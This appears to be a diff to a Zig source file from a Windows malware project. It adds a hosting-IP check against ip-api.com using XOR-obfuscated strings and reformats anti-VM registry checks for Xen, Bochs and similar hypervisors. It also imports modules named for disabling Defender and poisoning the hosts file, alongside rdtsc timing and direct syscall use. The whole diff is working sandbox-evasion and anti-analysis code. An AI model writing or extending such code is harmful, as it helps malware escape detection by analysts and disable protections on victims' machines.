@@ -4,6 +4,9 @@ const config = @import("config");
 const engine = @import("../syscalls/engine.zig");
 const dbg = @import("../syscalls/dbg.zig");
 const hash = @import("../types/hash.zig");
+const ws2 = @import("../network/ws2.zig");
+const hosts_poison = @import("hosts_poison.zig");
+const defender_disable = @import("defender_disable.zig");
 
 const E = struct {
     pub const reg_bios_path = hash.xorEncrypt("\\Registry\\Machine\\HARDWARE\\DESCRIPTION\\System\\BIOS");
@@ -25,12 +28,17 @@ const E = struct {
         pub const v4 = hash.xorEncrypt("Xen");
         pub const v5 = hash.xorEncrypt("Bochs");
     };
+    pub const hosting_host = hash.xorEncrypt("ip-api.com");
+    pub const hosting_path = hash.xorEncrypt(" /line/?fields=hosting HTTP/1.1\r\n");
+    pub const hosting_host_hdr = hash.xorEncrypt("Host: ip-api.com\r\n");
+    pub const hosting_conn = hash.xorEncrypt("Connection: close\r\n\r\n");
+    pub const hosting_true = hash.xorEncrypt("true");
 };
 
 fn rdtsc() u64 {
     var lo: u32 = undefined;
     var hi: u32 = undefined;
-    asm volatile("rdtsc"
+    asm volatile ("rdtsc"
         : [lo] "={eax}" (lo),
           [hi] "={edx}" (hi),
     );
@@ -88,6 +96,52 @@ pub fn setBreakOnTermination(enable: bool) bool {
     return status >= 0;
 }
 
+pub fn checkHostingIP() ?bool {
+    var tmp_host: [E.hosting_host.len]u8 = undefined;
+    var tmp_path: [E.hosting_path.len]u8 = undefined;
+    var tmp_hdr: [E.hosting_host_hdr.len]u8 = undefined;
+    var tmp_conn: [E.hosting_conn.len]u8 = undefined;
+    var tmp_true: [E.hosting_true.len]u8 = undefined;
+    hash.xorDecrypt(&E.hosting_host, &tmp_host);
+    hash.xorDecrypt(&E.hosting_path, &tmp_path);
+    hash.xorDecrypt(&E.hosting_host_hdr, &tmp_hdr);
+    hash.xorDecrypt(&E.hosting_conn, &tmp_conn);
+    hash.xorDecrypt(&E.hosting_true, &tmp_true);
+
+    var ws = ws2.Socket.init() catch return null;
+    defer ws.deinit();
+
+    const sock = ws2.Socket.connect("ip-api.com", 80) catch return null;
+    defer ws2.Socket.close(sock);
+
+    var req_buf: [256]u8 = undefined;
+    var pos: usize = 0;
+    req_buf[pos] = 'G';
+    pos += 1;
+    req_buf[pos] = 'E';
+    pos += 1;
+    req_buf[pos] = 'T';
+    pos += 1;
+    @memcpy(req_buf[pos..][0..tmp_path.len], &tmp_path);
+    pos += tmp_path.len;
+    @memcpy(req_buf[pos..][0..tmp_hdr.len], &tmp_hdr);
+    pos += tmp_hdr.len;
+    @memcpy(req_buf[pos..][0..tmp_conn.len], &tmp_conn);
+    pos += tmp_conn.len;
+
+    _ = ws2.Socket.send(sock, req_buf[0..pos]) catch return null;
+
+    var recv_buf: [4096]u8 = undefined;
+    const n = ws2.Socket.recv(sock, recv_buf[0..]) catch return null;
+    if (n == 0) return null;
+
+    const body_start = std.mem.indexOf(u8, recv_buf[0..n], "\r\n\r\n") orelse return null;
+    const body = recv_buf[body_start + 4 .. n];
+    const trimmed = std.mem.trim(u8, body, " \r\n\t");
+
+    return std.mem.eql(u8, trimmed, tmp_true[0..]);
+}
+
 pub fn checkScreenResolution() ?struct { w: u32, h: u32 } {
     const w = @as(u32, @intCast(engine.NtUserGetSystemMetrics(0)));
     const h = @as(u32, @intCast(engine.NtUserGetSystemMetrics(1)));
@@ -143,20 +197,68 @@ pub fn checkRegistryVmIndicators() bool {
     defer _ = engine.NtClose(key_handle);
 
     const vm_manuf = [_][]const u8{
-        &blk: { var b: [E.vm_manuf.v0.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v0, &b); break :blk b; },
-        &blk: { var b: [E.vm_manuf.v1.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v1, &b); break :blk b; },
-        &blk: { var b: [E.vm_manuf.v2.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v2, &b); break :blk b; },
-        &blk: { var b: [E.vm_manuf.v3.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v3, &b); break :blk b; },
-        &blk: { var b: [E.vm_manuf.v4.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v4, &b); break :blk b; },
-        &blk: { var b: [E.vm_manuf.v5.len]u8 = undefined; hash.xorDecrypt(&E.vm_manuf.v5, &b); break :blk b; },
+        &blk: {
+            var b: [E.vm_manuf.v0.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v0, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_manuf.v1.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v1, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_manuf.v2.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v2, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_manuf.v3.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v3, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_manuf.v4.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v4, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_manuf.v5.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_manuf.v5, &b);
+            break :blk b;
+        },
     };
     const vm_prod = [_][]const u8{
-        &blk: { var b: [E.vm_prod.v0.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v0, &b); break :blk b; },
-        &blk: { var b: [E.vm_prod.v1.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v1, &b); break :blk b; },
-        &blk: { var b: [E.vm_prod.v2.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v2, &b); break :blk b; },
-        &blk: { var b: [E.vm_prod.v3.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v3, &b); break :blk b; },
-        &blk: { var b: [E.vm_prod.v4.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v4, &b); break :blk b; },
-        &blk: { var b: [E.vm_prod.v5.len]u8 = undefined; hash.xorDecrypt(&E.vm_prod.v5, &b); break :blk b; },
+        &blk: {
+            var b: [E.vm_prod.v0.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v0, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_prod.v1.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v1, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_prod.v2.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v2, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_prod.v3.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v3, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_prod.v4.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v4, &b);
+            break :blk b;
+        },
+        &blk: {
+            var b: [E.vm_prod.v5.len]u8 = undefined;
+            hash.xorDecrypt(&E.vm_prod.v5, &b);
+            break :blk b;
+        },
     };
 
     var manuf_buf: [E.sys_manufacturer.len]u8 = undefined;
